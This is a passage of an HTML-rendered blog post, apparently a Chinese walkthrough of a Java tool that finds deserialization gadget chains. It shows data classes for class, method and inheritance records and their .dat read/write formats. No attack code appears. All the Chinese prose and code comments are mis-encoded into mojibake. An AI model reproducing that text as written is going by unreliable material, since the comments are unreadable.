class="number">1</span>],</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]),</span><br><span class="line">                members);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(ClassReference obj) &#123;</span><br><span class="line">        String interfaces;</span><br><span class="line">        <span class="keyword">if</span> (obj.interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            StringBuilder interfacesSb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (String iface : obj.interfaces) &#123;</span><br><span class="line">                interfacesSb.append(<span class="string">&quot;,&quot;</span>).append(iface);</span><br><span class="line">            &#125;</span><br><span class="line">            interfaces = interfacesSb.substring(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder members = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (Member member : obj.members) &#123;</span><br><span class="line">            members.append(<span class="string">&quot;!&quot;</span>).append(member.getName())</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(Integer.toString(member.getModifiers()))</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(member.getType().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.superClass,</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.toString(obj.isInterface),</span><br><span class="line">                members.length() == <span class="number">0</span> ? <span class="keyword">null</span> : members.substring(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-MethodReference"><a href="#4-MethodReference" class="headerlink" title="4. MethodReference"></a>4. MethodReference</h3><p>å®šä¹‰<strong>æ–¹æ³•ä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼ŒåŒæ ·ä½¿ç”¨ asm è®¿é—®è€…è®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodReference</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> isStatic;                     <span class="comment">// æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodReference</span><span class="params">(ClassReference.Handle classReference, String name, String desc, <span class="keyword">boolean</span> isStatic)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classReference = classReference;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        <span class="keyword">this</span>.isStatic = isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ClassReference.<span class="function">Handle <span class="title">getClassReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classReference;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Handle <span class="title">getHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Handle(classReference, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Handle</span><span class="params">(ClassReference.Handle classReference, String name, String desc)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.classReference = classReference;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ClassReference.<span class="function">Handle <span class="title">getClassReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> classReference;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            Handle handle = (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classReference != <span class="keyword">null</span> ? !classReference.equals(handle.classReference) : handle.classReference != <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (name != <span class="keyword">null</span> ? !name.equals(handle.name) : handle.name != <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span> desc != <span class="keyword">null</span> ? desc.equals(handle.desc) : handle.desc == <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> result = classReference != <span class="keyword">null</span> ? classReference.hashCode() : <span class="number">0</span>;</span><br><span class="line">            result = <span class="number">31</span> * result + (name != <span class="keyword">null</span> ? name.hashCode() : <span class="number">0</span>);</span><br><span class="line">            result = <span class="number">31</span> * result + (desc != <span class="keyword">null</span> ? desc.hashCode() : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>æ–¹æ³•ä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼š<code>ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">MethodReference</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodReference <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MethodReference(</span><br><span class="line">                <span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]),</span><br><span class="line">                fields[<span class="number">1</span>],</span><br><span class="line">                fields[<span class="number">2</span>],</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(MethodReference obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123;</span><br><span class="line">                obj.classReference.getName(),</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.desc,</span><br><span class="line">                Boolean.toString(obj.isStatic),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-inheritanceMap"><a href="#5-inheritanceMap" class="headerlink" title="5. inheritanceMap"></a>5. inheritanceMap</h3><p>å®šä¹‰<strong>ç»§æ‰¿ä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼ŒåŒ…æ‹¬ <code>å­ç±»-&gt;çˆ¶ç±»é›†åˆ</code>ã€<code>çˆ¶ç±»-&gt;å­ç±»é›†åˆ</code> ä¸¤ä¸ª Map ç±»å‹å˜é‡ï¼Œæ ¹æ®ç±»ä¿¡æ¯å¾—å‡ºï¼Œå…·ä½“å®ç°åœ¨ <code>InheritanceMap</code> ç±»ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap;    <span class="comment">// å­ç±»-&gt;çˆ¶ç±»é›†åˆ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap;       <span class="comment">// çˆ¶ç±»-&gt;å­ç±»é›†åˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ„é€ å‡½æ•°ï¼Œä» `å­ç±»-&gt;çˆ¶ç±»é›†åˆ` å¾—å‡º `çˆ¶ç±»-&gt;å­ç±»é›†åˆ`</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap ç»§æ‰¿å…³ç³»</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InheritanceMap</span><span class="params">(Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">        subClassMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            ClassReference.Handle child = entry.getKey();</span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœ key ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼Œæœ€åè¿”å› value</span></span><br><span class="line">                subClassMap.computeIfAbsent(parent, k -&gt; <span class="keyword">new</span> HashSet&lt;&gt;()).add(child);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt;&gt; entrySet() &#123;</span><br><span class="line">        <span class="keyword">return</span> inheritanceMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›çˆ¶ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz ç›®æ ‡ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSuperClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(parents);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç›®æ ‡çˆ¶ç±»æ˜¯å¦ä¸ºç›®æ ‡å­ç±»çš„çˆ¶ç±»</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz      ç›®æ ‡å­ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superClass ç›®æ ‡çˆ¶ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSubclassOf</span><span class="params">(ClassReference.Handle clazz, ClassReference.Handle superClass)</span> </span>&#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = inheritanceMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (parents == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parents.contains(superClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›å­ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz ç›®æ ‡ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ClassReference.Handle&gt; getSubClasses(ClassReference.Handle clazz) &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(clazz);</span><br><span class="line">        <span class="keyword">if</span> (subClasses == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableSet(subClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å­˜å‚¨ç»§æ‰¿å…³ç³»ï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// inheritanceMap.dat æ•°æ®æ ¼å¼ï¼š</span></span><br><span class="line">        <span class="comment">// ç±»å çˆ¶ç±»æˆ–è¶…ç±»æˆ–æ¥å£ç±»1 çˆ¶ç±»æˆ–è¶…ç±»æˆ–æ¥å£ç±»2 çˆ¶ç±»æˆ–è¶…ç±»æˆ–æ¥å£ç±»3 ...</span></span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> InheritanceMapFactory(), inheritanceMap.entrySet());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä» inheritanceMap.dat åŠ è½½ç»§æ‰¿å…³ç³»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title">load</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : DataLoader.loadData(</span><br><span class="line">                Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> InheritanceMapFactory())) &#123;</span><br><span class="line">            inheritanceMap.put(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InheritanceMap(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>ç»§æ‰¿ä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼ˆä»…é’ˆå¯¹ <code>å­ç±»-&gt;çˆ¶ç±»é›†åˆ</code>ï¼‰ï¼š<code>ç±»å çˆ¶ç±»/è¶…ç±»/æ¥å£ç±»</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceMapFactory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">ClassReference</span>.<span class="title">Handle</span>, <span class="title">Set</span>&lt;<span class="title">ClassReference</span>.<span class="title">Handle</span>&gt;&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.Handle clazz = <span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            superClasses.add(<span class="keyword">new</span> ClassReference.Handle(fields[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AbstractMap.SimpleEntry&lt;&gt;(clazz, superClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; obj) &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> String[obj.getValue().size()+<span class="number">1</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = obj.getKey().getName();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle handle : obj.getValue()) &#123;</span><br><span class="line">            fields[i++] = handle.getName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-InheritanceDeriver"><a href="#6-InheritanceDeriver" class="headerlink" title="6. InheritanceDeriver"></a>6. InheritanceDeriver</h3><p>å®ç°<strong>ç»§æ‰¿ä¿¡æ¯</strong>å’Œ<strong>é‡å†™æ–¹æ³•ä¿¡æ¯</strong>çš„æ”¶é›†ï¼Œå­˜å‚¨é‡å†™ä¿¡æ¯æ—¶ä»¥ç¼©è¿›è¡¨ç¤ºé‡å†™æ–¹æ³•ï¼Œå…·ä½“å­˜å‚¨æ ¼å¼åœ¨ <code>GadgetChainDiscovery</code> ä¸­ç»™å‡ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InheritanceDeriver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(InheritanceDeriver.class);</span><br><span class="line"></span><br><span 